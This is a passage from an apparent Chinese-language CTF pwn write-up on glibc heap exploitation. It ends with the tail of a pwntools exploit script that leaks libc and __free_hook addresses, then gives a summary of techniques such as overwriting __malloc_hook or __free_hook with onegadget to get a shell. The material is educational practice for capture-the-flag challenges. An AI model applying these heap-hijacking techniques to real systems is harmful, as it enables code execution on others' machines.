hex(libc_base))</span><br><span class="line">success(<span class="string">"libc_system: "</span> + hex(libc_system))</span><br><span class="line">success(<span class="string">"__free_hook: "</span> + hex(__free_hook))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

</li>
</ol>
<h2 id="write-IO-FILE-vtable"><a href="#write-IO-FILE-vtable" class="headerlink" title="write _IO_FILE vtable"></a>write _IO_FILE vtable</h2><p>这个还没有接触到过，也没有自己实现过，待补充。</p>
<h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><ul>
<li>之前确实有碰到过<code>__malloc_hook</code>改onegadget一次打不通的情况，但是都是通过<code>realloc</code>调整实现的（还以为通用了，结果打脸了），这次好几道题都没办法用这种办法实现，所以学习了一波。</li>
<li>确实没有遇到过改top chunk的利用方法，这次算是学到了。</li>
<li><code>__free_hook</code>还是比<code>__malloc_hook</code>稳，onegadget的约束有的时候真的是太难满足了。</li>
<li>发现两道利用<code>malloc_printerr</code>触发<code>__malloc_hook</code>的从而onegadget来getshell的题目，都是用的<code>[rsp+0x50]==NULL</code>这个约束，是小概率还是大概率还是必然？</li>
</ul>
<h1 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h1><ol>
<li><a href="https://bbs.pediy.com/thread-225973.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-225973.htm</a></li>
<li><a href="https://xuanxuanblingbling.github.io/ctf/pwn/2020/03/21/garden/" target="_blank" rel="noopener">https://xuanxuanblingbling.github.io/ctf/pwn/2020/03/21/garden/</a></li>
<li><a href="https://www.anquanke.com/post/id/171283#h2-0" target="_blank" rel="noopener">https://www.anquanke.com/post/id/171283#h2-0</a></li>
<li><a href="https://bbs.pediy.com/thread-230028.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-230028.htm</a></li>
<li><a href="https://elixir.bootlin.com/glibc/glibc-2.23/source" target="_blank" rel="noopener">https://elixir.bootlin.com/glibc/glibc-2.23/source</a></li>
</ol>
]]></content>
      <categories>
        <category>Writeup</category>
        <category>LearningNotes</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>pwn</tag>
      </tags>
  </entry>
</search>
